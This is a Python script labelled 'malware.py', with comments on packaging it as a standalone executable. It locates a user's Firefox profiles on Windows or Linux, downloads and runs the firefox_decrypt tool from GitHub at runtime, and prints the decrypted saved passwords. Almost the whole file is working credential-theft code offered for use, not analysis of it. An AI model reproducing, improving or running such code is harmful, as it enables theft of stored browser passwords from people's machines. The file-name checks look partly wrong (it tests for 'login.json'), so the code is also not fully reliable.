#!/usr/bin/env python3
# coding: cp850
# pip3 install pyinstaller
# pyinstaller --onefile malware.py

import subprocess, os, sys, requests, tempfile


def run_command(cmd):
    try:
        stdout = subprocess.check_output(cmd, shell=True)
        return stdout.decode("utf-8" if os.name == 'posix' else "cp850").replace("\n", "")
    except Exception as err:
        print(f"\n\n\t[!] An error ocurred executing {cmd}\nErr: {err}\n\n")
        return None


def get_firefox_profiles(user):
    windows_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    linux_path = f"/home/{user}/.mozilla/firefox"

    path_to_use = linux_path if os.name == 'posix' else windows_path

    try:
        profiles = [profile for profile in os.listdir(path_to_use) if "default" in profile]
        return profiles, path_to_use
    
    except Exception as err:
        print(f"\n\n\t[!] An error ocurred finding firefox profiles in {path_to_use}\nErr: {err}\n\n")
        return None


def get_firefox_pass(profile):
    r = requests.get("https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py")
    temp_dir = tempfile.mkdtemp()
    os.chdir(temp_dir)

    with open("fd.py", "wb") as f:
        f.write(r.content)

    stdout = run_command(f"python3 fd.py {profile}")
    os.removedirs(temp_dir)

    return stdout

if __name__ == "__main__":
    username = run_command("whoami") if os.name == 'posix' else run_command("whoami").split("\\")[1] # Get username 
    profiles, path_used = get_firefox_profiles(username)

    if not profiles :
        print(f"\n\n\t[!] No firefox profiles found.\n\n")
        sys.exit(1)
    else:
        for profile in profiles:
            path_to_search = f"{path_used}/{profile}" if os.name == 'posix' else f"{path_used}\\{profile}"
            files = os.listdir(path_to_search)
            if "login.json" in files or "signons.sqlite" in files:
                passwords = get_firefox_pass(path_to_search)
                print(passwords)
            else:
                print("\n\n\t[!] No password files in firefox profiles.\n\n")
                sys.exit(0)